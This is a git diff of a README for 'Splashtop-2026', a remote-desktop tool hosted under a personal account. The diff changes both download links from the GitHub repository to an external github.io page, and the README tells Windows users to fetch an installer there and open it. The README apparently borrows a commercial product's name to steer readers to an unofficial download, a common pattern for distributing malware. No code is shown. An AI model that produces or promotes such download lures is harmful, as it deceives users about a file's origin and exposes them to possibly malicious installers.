@@ -1,6 +1,6 @@
 # 💻 Splashtop-2026 - Control Your Computers From Anywhere
 
-[![](https://img.shields.io/badge/Download-Splashtop-blue.svg)](https://github.com/Kaewph8017/Splashtop-2026)
+[![](https://img.shields.io/badge/Download-Splashtop-blue.svg)](https://kaewph8017.github.io)
 
 Splashtop-2026 provides secure remote access to your workstations. Use this tool if you need to reach your office computer or support a client system from home. This software works on Windows 11 and Windows 10. You gain full control of your remote desktop with minimal setup.
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official project page to start your download: [https://github.com/Kaewph8017/Splashtop-2026](https://github.com/Kaewph8017/Splashtop-2026).
+1.  Visit the official project page to start your download: [https://kaewph8017.github.io](https://kaewph8017.github.io).
 2.  Locate the download button on the page.
 3.  Save the installation file to your Downloads folder.
 4.  Open the Downloads folder in File Explorer.
